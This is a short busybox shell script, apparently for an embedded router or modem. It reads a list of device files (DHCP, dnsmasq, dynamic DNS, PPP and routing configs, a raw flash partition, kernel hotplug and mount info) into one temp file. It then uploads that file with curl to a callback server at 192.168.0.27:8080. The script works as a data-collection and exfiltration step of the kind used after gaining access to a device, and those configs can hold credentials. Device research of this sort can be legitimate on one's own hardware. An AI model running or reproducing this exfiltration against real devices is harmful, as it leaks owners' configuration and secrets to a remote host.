#!/bin/sh
CB="http://192.168.0.27:8080"
BB=/bin/busybox
# Probe multiple files of interest
for f in /var/tmp/dconf/dnsmasq.conf /var/tmp/dconf/udhcpd.conf /var/tmp/dconf/dyndns.conf /var/tmp/dconf/noipdns.conf /var/tmp/dconf/udhcpc.conf /var/tmp/dconf/pppd_options /var/tmp/dconf/zebra.conf /var/run/misc/misc_rw/0x00300000 /proc/sys/kernel/hotplug /proc/mounts /etc/ppp/ip-up /etc/ppp/ip-down /etc/rcS_hook/.gitkeep; do
    $BB echo "===== $f =====" >> /tmp/cat_probe.txt
    $BB cat "$f" 2>&1 >> /tmp/cat_probe.txt || $BB echo "(missing or unreadable)" >> /tmp/cat_probe.txt
done
/usr/sbin/curl -m 10 -T /tmp/cat_probe.txt "${CB}/probe_log?tag=cat_probe" 2>/dev/null || true
